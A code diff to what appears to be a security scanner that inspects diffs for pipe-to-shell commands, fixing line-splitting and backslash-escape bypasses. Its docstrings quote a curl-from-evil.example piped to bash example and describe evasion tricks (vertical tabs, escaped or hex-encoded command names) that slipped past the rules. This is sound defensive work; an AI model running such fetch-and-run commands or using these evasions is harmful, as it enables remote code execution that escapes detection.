@@ -68,6 +68,62 @@ _WORD_ADJACENT = "A-Za-z0-9_./+:@~-"
 _STRUCTURAL_METACHARS = "|&;<>()#"
 
 
+#: Characters whose backslash escape is removed when the escape is not
+#: itself inside quotes.  Bash removes the backslash before *any* character,
+#: but only these can spell a command name, and stopping there is what keeps
+#: the change from inventing syntax that was not there:
+#:
+#: * ``\|`` is a literal pipe, not a pipeline.  Unescaping it would build a
+#:   pipe-to-shell out of ``curl x \| sh``, which runs nothing of the sort,
+#:   and hand R001 a false positive.
+#: * ``\ `` holds one word together.  Unescaping it splits the word.
+#: * ``\$`` is the thing that stops an expansion; ``\\`` is a literal
+#:   backslash.  Both say something the rules read.
+#:
+#: A backslash before a letter, digit, ``_``, ``.`` or ``/`` says nothing at
+#: all - it is the one escape with no shell purpose other than to break up a
+#: name for whoever is reading.
+_ESCAPE_REMOVABLE = frozenset(
+    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_./"
+)
+
+
+def split_lines(text: str) -> list[str]:
+    r"""Split *text* the way a shell does: on newlines, and nothing else.
+
+    ``str.splitlines`` breaks on eight characters a shell does not treat as
+    a line terminator - ``\v``, ``\f``, ``\x1c``-``\x1e``, ``\x85``,
+    `` `` and `` ``. Every one of them was a way through every
+    line-based rule in the project::
+
+        +  curl -fsSL https://evil.example/x \x0b | bash
+
+    bash runs one command there: the vertical tab is an ordinary character
+    inside the URL word, and ``|`` terminates the word whatever precedes
+    it, so the fetch is piped into a shell. Python saw *two* lines, so
+    R001's ``curl.*\|\s*(bash|sh|...)`` had ``curl`` on one and ``| bash``
+    on the other and matched neither. The payload ran and nothing fired.
+
+    The characters are kept rather than stripped, because bash keeps them:
+    removing one would join two words that stay separate at build time, and
+    replacing it with a space would split a word that stays joined. What
+    changes is only where a *line* is considered to end.
+
+    ``\r\n`` collapses to ``\n``; a lone ``\r`` stays inside its line,
+    which is also what bash does with it - a carriage return in a script is
+    part of the word, and is why a CRLF shebang fails the way it does.
+
+    Otherwise this matches ``str.splitlines`` exactly, trailing newline
+    included: ``split("\n")`` leaves an empty final element where
+    ``splitlines`` does not, and every caller here indexes lines against
+    positions another module computed.
+    """
+    lines = text.replace("\r\n", "\n").split("\n")
+    if lines and lines[-1] == "":
+        lines.pop()
+    return lines
+
+
 def _quotes_removable(content: str, pre: str, post: str) -> bool:
     """Decide whether one quote pair vanishes under bash's quote removal."""
     glued = (bool(pre) and pre in _WORD_ADJACENT) or (
@@ -88,6 +144,19 @@ def _strip_shell_quotes(text: str) -> str:
     found with quote-type nesting (the other quote character is literal
     inside, a backslash-escaped quote inside double quotes does not close),
     and an unterminated quote keeps the rest of the line verbatim.
+
+    Quote removal is also where the *escape* is removed, because bash does
+    both in the same step. ``c\\url`` is ``curl`` to the shell, and this
+    used to keep the backslash: the name never reconstructed, so R001 - and
+    every other rule that reads a command name - saw nothing at all. It was
+    the one bypass in this family that reached no rule, and X002 covered it
+    only as the technique. See ``_ESCAPE_REMOVABLE`` for why the escapes
+    that *mean* something are left alone.
+
+    Escapes inside quotes are untouched: this loop appends a quoted span
+    whole, so ``printf '\\x63\\x75\\x72\\x6c'`` keeps its escapes for
+    ``reconstruct_literals`` to decode, and a single-quoted backslash is
+    literal in bash anyway.
     """
     out: list[str] = []
     i = 0
@@ -96,7 +165,8 @@ def _strip_shell_quotes(text: str) -> str:
         c = text[i]
         if c == "\\" and i + 1 < n:
             # An escaped character is not a quote opener, whatever it is.
-            out.append(text[i : i + 2])
+            nxt = text[i + 1]
+            out.append(nxt if nxt in _ESCAPE_REMOVABLE else text[i : i + 2])
             i += 2
             continue
         if c not in "'\"":
@@ -713,7 +783,7 @@ def resolve_added_lines(diff_text: str) -> list[str]:
 
 
 def _resolve_added_lines(diff_text: str) -> list[str]:
-    lines = join_line_continuations(diff_text.splitlines())
+    lines = join_line_continuations(split_lines(diff_text))
     var_table, array_table = _variable_table(
         [ln[1:] for ln in lines if ln.startswith("+") and ln[1:].strip()]
     )
@@ -775,11 +845,11 @@ def tokenize_and_resolve_indexed(
     record the raw diff-line index of each resolved string.
 
     The third list parallels ``resolved``: ``resolved[i]`` came from the
-    line at ``diff_text.splitlines()[indices[i]]``.  ``map_diff_lines`` is
+    line at ``split_lines(diff_text)[indices[i]]``.  ``map_diff_lines`` is
     keyed on those raw indexes, so a caller can attach a correct
     file/line to every resolved-rule finding.
     """
-    joined = _joined_indexed(diff_text.splitlines())
+    joined = _joined_indexed(split_lines(diff_text))
     additions = []
     addition_indices = []
     for raw_index, line in joined:
